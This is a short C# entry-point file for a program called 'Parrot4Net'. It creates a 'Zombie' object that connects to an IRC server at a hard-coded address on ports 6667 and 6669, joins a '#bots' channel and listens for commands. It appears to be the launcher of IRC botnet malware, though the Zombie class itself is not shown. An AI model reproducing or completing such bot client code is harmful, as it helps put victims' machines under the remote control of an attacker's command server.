using System.Collections.Generic;

namespace Parrot4Net
{
    class Program
    {
        static void Main(string[] args)
        {
            string server = "192.168.78.141";
            int port = 6667;
            int alterport = 6669;
            string channel = "#bots";
            Zombie z = new Zombie(server, port, alterport, channel);
            z.ConnectAndListen();
        }
    }
}
